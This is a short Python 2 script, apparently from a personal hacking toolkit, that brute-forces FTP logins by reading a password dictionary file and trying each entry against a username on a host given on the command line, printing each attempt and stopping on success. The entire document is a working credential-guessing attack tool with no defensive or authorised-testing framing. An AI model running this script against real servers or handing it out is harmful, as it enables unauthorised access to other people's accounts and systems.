#!/usr/bin/python
import ftplib
import sys

ftp = ftplib.FTP(sys.argv[1])
username = sys.argv[2]

print ftp.getwelcome()
# pwds = ['root','123456','password']
tries = 0
for p in open('/Users/bl4de/hacking/dictionaries/passwords_5445.txt', 'r').readlines():
# for p in pwds:
    try:
        tries = tries + 1
        print "[+] try {}: trying {}:{}".format(tries, username, p.strip())
        ftp.sendcmd('USER {}'.format(username))
        resp = ftp.sendcmd('PASS {}'.format(p.strip()))

        print "[+] Legged in! -> {}".format(str(resp))
        exit(0)
    except Exception, e:
        print e
        pass

